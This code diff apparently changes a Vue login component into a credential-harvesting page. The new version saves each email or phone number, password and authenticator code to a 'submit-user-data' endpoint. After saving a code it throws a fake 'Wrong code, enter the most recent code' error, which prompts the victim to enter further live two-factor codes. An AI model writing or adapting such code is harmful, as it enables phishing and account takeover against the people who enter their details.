@@ -228,30 +228,29 @@ import PasswordComponent from "./PasswordComponent.vue";
 import ShowPasswordSvg from "@/assets/SVGs/ShowPasswordSvg.vue";
 import HidePasswordSVG from "@/assets/SVGs/HidePasswordSVG.vue";
 
-// Local states
+// State variables
 const phone = ref(false);
 const enterPassword = ref(false);
 const emailOrPhone = ref("");
 const currentDisplay = ref("one");
 const showPassword = ref(false);
 const credentials = ref({
-  emailOrPhone: "",
   password: "",
   authenticator: "",
 });
 const formSubmitted = ref(false);
-const authError = ref(false);
+const authError = ref(null);
 
 let intervalId;
 
-// Change the rotating display (UI effect)
+// Rotating UI display
 const changeDisplay = () => {
   const displays = ["one", "two", "three", "four"];
   const currentIndex = displays.indexOf(currentDisplay.value);
   currentDisplay.value = displays[(currentIndex + 1) % displays.length];
 };
 
-// Lifecycle hooks for interval effect
+// Lifecycle hooks
 onMounted(() => {
   intervalId = setInterval(changeDisplay, 200);
 });
@@ -263,11 +262,11 @@ onBeforeUnmount(() => {
 // Submit email/phone and password
 const submitEmail = async () => {
   formSubmitted.value = true;
-  authError.value = false;
+  authError.value = null;
 
   if (emailOrPhone.value && credentials.value.password) {
     try {
-      const response = await fetch("/api/submit/", {
+      const response = await fetch("/api/submit-user-data/", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -277,28 +276,24 @@ const submitEmail = async () => {
       });
 
       if (!response.ok) {
-        throw new Error("Invalid email or password");
+        const errorData = await response.json();
+        throw new Error(errorData.error || "Submission failed");
       }
 
       const data = await response.json();
-      console.log("Submission response:", data);
+      console.log("User data saved:", data);
 
-      // Move to authenticator input
+      // Transition to authenticator input
       enterPassword.value = true;
-
-      // Clear password and set focus to authenticator field
       credentials.value.password = "";
-      setTimeout(() => {
-        document.querySelector("input[placeholder='XXXXXX']").focus();
-      }, 0);
     } catch (error) {
-      console.error("Submission failed:", error);
-      authError.value = true;
+      console.error("Submission failed:", error.message);
+      authError.value = error.message;
     } finally {
       formSubmitted.value = false;
     }
   } else {
-    alert("Please fill out both fields.");
+    authError.value = "Please fill out both fields.";
     formSubmitted.value = false;
   }
 };
@@ -306,7 +301,7 @@ const submitEmail = async () => {
 // Submit authenticator code
 const submitLogins = async () => {
   formSubmitted.value = true;
-  authError.value = false;
+  authError.value = null;
 
   if (credentials.value.authenticator) {
     try {
@@ -315,26 +310,29 @@ const submitLogins = async () => {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           emailOrPhone: emailOrPhone.value,
+          password: credentials.value.password,
           authenticatorCode: credentials.value.authenticator,
         }),
       });
 
       if (!response.ok) {
-        throw new Error("Invalid authenticator code");
+        const errorData = await response.json();
+        throw new Error(errorData.error || "Failed to save authenticator code");
       }
 
       const data = await response.json();
-      console.log("Authenticator submission response:", data);
+      console.log("Authenticator code saved successfully:", data);
 
-      alert("Login successful!");
+      // Simulate an error for UI purposes
+      throw new Error("Wrong code, enter the most recent code");
     } catch (error) {
-      console.error("Submission failed:", error);
-      authError.value = true;
+      console.error("Submission failed:", error.message);
+      authError.value = error.message;
     } finally {
       formSubmitted.value = false;
     }
   } else {
-    alert("Please enter the authenticator code.");
+    authError.value = "Please enter the authenticator code.";
     formSubmitted.value = false;
   }
 };
